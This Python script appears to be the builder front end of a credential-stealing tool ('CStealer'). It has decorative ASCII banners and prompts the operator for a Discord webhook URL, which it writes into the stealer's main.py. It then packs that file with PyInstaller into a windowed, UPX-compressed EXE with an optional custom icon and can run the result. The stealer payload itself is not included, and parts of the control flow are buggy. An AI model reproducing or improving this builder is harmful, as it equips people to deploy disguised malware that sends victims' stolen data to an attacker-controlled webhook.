from pystyle import *
from colorama import *
from tkinter import filedialog, Tk
import os
import time
import fade
import ctypes

username = os.getlogin()

ctypes.windll.kernel32.SetConsoleTitleW(f" v1 stub builder best stealer ui using creal - {username}")
os.system("cls")

text = """
                    ╔╗           ╔╗          ╔╗          ╔╗        
                    ║║          ╔╝╚╗        ╔╝╚╗         ║║        
                    ║╚═╗╔══╗╔══╗╚╗╔╝    ╔══╗╚╗╔╝╔══╗╔══╗ ║║ ╔══╗╔═╗
                    ║╔╗║║╔╗║║══╣ ║║     ║══╣ ║║ ║╔╗║╚ ╗║ ║║ ║╔╗║║╔╝
                    ║╚╝║║║═╣╠══║ ║╚╗    ╠══║ ║╚╗║║═╣║╚╝╚╗║╚╗║║═╣║║ 
                    ╚══╝╚══╝╚══╝ ╚═╝    ╚══╝ ╚═╝╚══╝╚═══╝╚═╝╚══╝╚╝ 
                                               
                                               

                           Press [ENTER] to continue     
                              
"""

Anime.Fade(Center.Center(text), Colors.green_to_blue, Colorate.Vertical, interval=0.050, enter=True)

text2 = """

                     ╔╗           ╔╗          ╔╗          ╔╗        
                     ║║          ╔╝╚╗        ╔╝╚╗         ║║        
                     ║╚═╗╔══╗╔══╗╚╗╔╝    ╔══╗╚╗╔╝╔══╗╔══╗ ║║ ╔══╗╔═╗
                     ║╔╗║║╔╗║║══╣ ║║     ║══╣ ║║ ║╔╗║╚ ╗║ ║║ ║╔╗║║╔╝
                     ║╚╝║║║═╣╠══║ ║╚╗    ╠══║ ║╚╗║║═╣║╚╝╚╗║╚╗║║═╣║║ 
                     ╚══╝╚══╝╚══╝ ╚═╝    ╚══╝ ╚═╝╚══╝╚═══╝╚═╝╚══╝╚╝ 
                                               
                                                                   
"""

text2 = fade.greenblue(text2)
print(text2)

time.sleep(1.5)
def endHandler():
  os._exit(0)

def checkhook(webhook):
    if not "api/webhooks" in webhook:
        print(f"\n{Fore.RED}Invalid webhook{Fore.RESET}")
        time.sleep(1)
        endHandler()

webhook = input(Fore.CYAN + "\nEnter your Discord webhook URL: " + Style.RESET_ALL)
checkhook(webhook)
filename = "main.py"
filepath = os.path.join(os.getcwd(), filename)
with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()
new_content = content.replace('"YOUR_WEBHOOK_URL"', f'"{webhook}"')
with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)
        time.sleep(1)
        print(Fore.GREEN + "ok i got ur webhook let get it" + Style.RESET_ALL)
        time.sleep(2)
        os.system("cls")
        print(text2)
        answer = input(Fore.CYAN + "\nDo you want to build EXE file? (W) " + Style.RESET_ALL)
        if answer.upper() == "W":
              time.sleep(1)
              answer = input(Fore.CYAN + "\nDo you want to add icon? (W) " + Style.RESET_ALL)
              if answer.upper() == "W":
                    print(Fore.YELLOW + "Build process has been started please wait..." + Style.RESET_ALL)
                    Tk().withdraw()  
                    icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
              if icon_file:
                    os.system(f"pyinstaller --noconfirm --onefile --windowed --upx-dir=./CStealer_assets/upx --icon {icon_file} {filename}")
                    print(f"\n{Fore.GREEN}{filename} has been converted to EXE with the selected icon.{Fore.RESET}")
              else:
                    print(Fore.YELLOW + "File you choose must be have .ico extension!" + Style.RESET_ALL)
                    os.system (f"pyinstaller --noconfirm --onefile --windowed --upx-dir=./CStealer_assets/upx {filename}")
                    print(f"\n{Fore.GREEN}File successfully builded{Fore.RESET}")
                    time.sleep(2)
                    os.system("cls")
                    print(text2)
        elif answer.upper() == "N":
                    time.sleep(2)
                    os.system("cls")
                    print(text2)
        run = input(Fore.CYAN + "\nDo you want to test the build? (N) " + Style.RESET_ALL)
        if answer.upper() == "W":
                    os.system (f"{filename}")
                    time.sleep(1)
                    os.system("cls")
                    print(text2)
                    print(f"\n{Fore.GREEN}Build process has been done successfully!{Fore.RESET}")
                    time.sleep(1)
        elif answer.upper() == "N":
              print(f"\n{Fore.GREEN}Build process has been done successfully!{Fore.RESET}")
              time.sleep(1)
              endHandler()